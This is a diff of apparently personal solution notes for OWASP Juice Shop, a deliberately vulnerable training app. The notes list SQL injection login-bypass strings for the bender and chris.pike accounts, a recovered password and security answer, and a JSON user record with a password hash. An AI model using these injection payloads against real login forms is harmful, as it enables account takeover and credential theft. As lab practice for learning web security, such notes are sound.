@@ -104,7 +104,7 @@ Security Questiob = Samuel
 
 ****************************************
 bender@juice-sh.op
-Password = 
+Password = Stop'n'Drop
 You can use for enter = ' or 1=1 and email like('%bender%');--
 {
   "status": "success",
@@ -130,3 +130,28 @@ You can use for enter = ' or 1=1 and email like('%bender%');--
 ******************************************
 chris.pike@juice-sh.op
 Enter for = chris.pike@juice-sh.op'--
+
+******************************************
+uvogin@juice-sh.op
+security answer = Silence of the Lambs
+
+{
+  "status": "success",
+  "data": {
+    "id": 16,
+    "username": "",
+    "email": "uvogin@juice-sh.op",
+    "password": "05f92148b4b60f7dacd04cceebb8f1af",
+    "role": "customer",
+    "deluxeToken": "",
+    "lastLoginIp": "0.0.0.0",
+    "profileImage": "assets/public/images/uploads/default.svg",
+    "totpSecret": "",
+    "isActive": true,
+    "createdAt": "2020-12-25 11:55:39.720 +00:00",
+    "updatedAt": "2020-12-25 11:55:39.720 +00:00",
+    "deletedAt": null
+  },
+  "iat": 1608897572,
+  "exp": 1608915572
+}
